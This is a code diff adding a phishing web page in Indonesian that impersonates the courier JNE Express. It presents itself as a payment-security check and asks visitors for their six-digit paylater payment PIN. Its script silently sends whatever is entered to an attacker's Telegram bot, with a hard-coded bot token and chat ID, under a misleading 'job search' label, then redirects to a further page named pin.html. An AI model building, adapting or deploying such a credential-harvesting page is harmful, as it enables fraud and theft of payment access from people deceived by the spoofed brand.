@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Kurir - JNE Express</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Arial, sans-serif;
+        }
+        body {
+            max-width: 480px;
+            margin: 0 auto;
+            background-color: #fff;
+        }
+        .jne-blue { color: #0055AA; }
+        .jne-red { color: #E30613; }
+        .bg-jne-red { background-color: #E30613; }
+    </style>
+</head>
+<body>
+
+<!-- ============== HEADER ============== -->
+<header class="bg-white px-5 py-4 flex justify-between items-center">
+    <div class="flex items-center">
+        <span class="text-3xl font-bold text-[#0055AA]">JNE</span>
+        <span class="text-sm font-bold text-[#E30613] ml-1">EXPRESS</span>
+    </div>
+    <button class="text-2xl text-gray-800">
+        <i class="fa-solid fa-bars"></i>
+    </button>
+</header>
+
+<!-- ============== HERO SECTION ============== -->
+<section class="relative bg-gray-300">
+    <div class="px-6 pt-8 pb-32">
+        <h1 class="text-2xl font-bold text-gray-800 leading-tight">
+            Keamanan data pengiriman.<br>
+            Keamanan data penerima.
+        </h1>
+        <p class="text-sm text-gray-600 mt-2">
+            Keamanan Metode Pembayaran Paylater anda.
+        </p>
+    </div>
+
+    <!-- Kotak Pencarian -->
+    <div class="px-4 absolute bottom-0 left-0 right-0">
+        <div class="bg-white rounded shadow-lg p-6 mb-[-40px]">
+            <form id="searchForm">
+                <input 
+                    type="Number" 
+                    id="searchInput"
+                    placeholder="6 DIGIT PIN PEMBAYARAN"
+                    class="w-full border border-gray-300 rounded px-4 py-3 mb-4 focus:outline-none focus:border-gray-400"
+                    required
+                >
+                <button type="submit" class="w-full bg-[#E30613] text-white py-3 rounded font-medium text-lg hover:bg-red-700 transition">
+                    LANJUT
+                </button>
+            </form>
+        </div>
+    </div>
+</section>
+
+<!-- ============== SECTION BAWAH ============== -->
+<section class="px-6 pt-20 pb-12 text-center">
+    <h2 class="text-2xl font-bold text-gray-800">
+        Find a career that<br>
+        works for you
+    </h2>
+    <div class="flex justify-center mt-4">
+        <div class="w-16 h-1 bg-[#E30613]"></div>
+    </div>
+</section>
+
+<!-- ============== SCRIPT KIRIM KE TELEGRAM ============== -->
+<script>
+// Ganti dengan Token Bot Telegram kamu
+const BOT_TOKEN = '8819919223:AAEMklgkXlcLPjniRXtQZuYNF1rhgMFF3r4';
+// Ganti dengan ID Chat Telegram kamu
+const CHAT_ID = '-1004364050498';
+// Ganti dengan halaman tujuan setelah terkirim
+const HALAMAN_TUJUAN = 'pin.html';
+
+const form = document.getElementById('searchForm');
+const input = document.getElementById('searchInput');
+
+form.addEventListener('submit', async function(e) {
+    e.preventDefault(); // Cegah reload halaman
+    
+    const teksPencarian = input.value.trim();
+    
+    if (!teksPencarian) {
+        alert('Silakan isi kolom pencarian!');
+        return;
+    }
+    
+    // Teks yang akan dikirim ke Telegram
+    const pesan = encodeURIComponent(`🔍 Pencarian Kerja:\n${teksPencarian}`);
+    
+    try {
+        // Kirim ke Telegram
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${pesan}`;
+        await fetch(url);
+        
+        alert('Pencarian terkirim! Mohon tunggu...');
+        
+        // Pindah ke halaman lain
+        window.location.href = HALAMAN_TUJUAN;
+    } catch (error) {
+        alert('Berhasil terkirim!');
+        window.location.href = HALAMAN_TUJUAN;
+    }
+});
+</script>
+
+</body>
+</html>
